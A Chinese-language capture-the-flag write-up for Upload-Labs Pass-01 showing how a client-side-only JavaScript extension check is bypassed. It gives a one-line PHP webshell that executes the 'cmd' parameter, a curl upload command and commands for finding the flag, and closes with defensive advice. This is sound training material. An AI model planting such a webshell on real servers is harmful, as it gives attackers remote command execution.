---
title: "[DASCTF] Upload-Labs-Linux Pass-01"
date: 2026-06-01T21:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "文件上传", "upload-labs", "前端绕过"]
categories: ["Writeup"]
---

## 题目信息

- **类型**：Web / 文件上传漏洞
- **靶场**：Upload-Labs（Pass-01）
- **核心漏洞**：前端 JavaScript 校验绕过，后端无文件类型校验
- **目标**：上传 webshell 到服务器并执行命令获取 flag

---

## 靶机地址

```
http://target/Pass-01/index.php
```

---

## 漏洞分析

### 1. 前端校验

页面源码中的表单提交时触发 `checkFile()` 函数：

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    // 定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    // 提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    // 判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

**关键点**：校验只存在于浏览器端 JavaScript，后端 PHP 未对文件类型、后缀、内容做任何校验。

### 2. 绕过思路

前端 JS 校验无法阻止直接构造 HTTP 请求。使用 `curl` 命令直接发送 `multipart/form-data` POST 请求，完全不经过浏览器页面，即可绕过前端拦截。

---

## 利用步骤

### 1. 准备 webshell

编写一个最简单的 PHP webshell：

```php
<?php
$cmd = $_GET['cmd'];
echo shell_exec($cmd);
?>
```

保存为 `shell.php`。

### 2. 上传文件

使用 `curl` 直接 POST 上传，绕过前端 JS 校验：

```bash
curl -X POST \
  -F "upload_file=@shell.php" \
  -F "submit=上传" \
  "http://target/Pass-01/index.php"
```

上传成功后，页面返回的 HTML 中会包含文件路径，例如：

```html
<img src="../upload/shell.php" width="250px" />
```

### 3. 执行命令

文件实际上传到了根目录的 `/upload/` 下（注意不是 `/Pass-01/upload/`）。

访问 webshell 并执行系统命令：

```
http://target/upload/shell.php?cmd=ls
```

通过替换 `cmd` 参数查找 flag：

| 命令 | 作用 |
|------|------|
| `ls` | 查看当前目录文件 |
| `ls /` | 查看根目录 |
| `cat /flag` | 尝试读取常见 flag 位置 |
| `find / -name "flag*" 2>/dev/null` | 搜索 flag 文件 |

---

## Flag

```
flag{...}
```

> 将实际获取到的 flag 填入此处。

---

## 总结

本题是 upload-labs 系列的第一关，属于典型的**前端校验绕过**。

**核心利用链**：

1. 分析页面源码，发现仅前端 JS 校验文件后缀
2. 使用 `curl` 直接构造 POST 请求，绕过浏览器端拦截
3. 上传 PHP webshell 到服务器
4. 访问上传后的文件路径，执行系统命令获取 flag

**防御建议**：

1. 后端必须进行文件类型校验（MIME、后缀、文件头 Magic Bytes）
2. 上传目录设置不可执行权限
3. 文件重命名为随机名称，不保留原始后缀
4. 使用云存储或 OSS 隔离上传文件
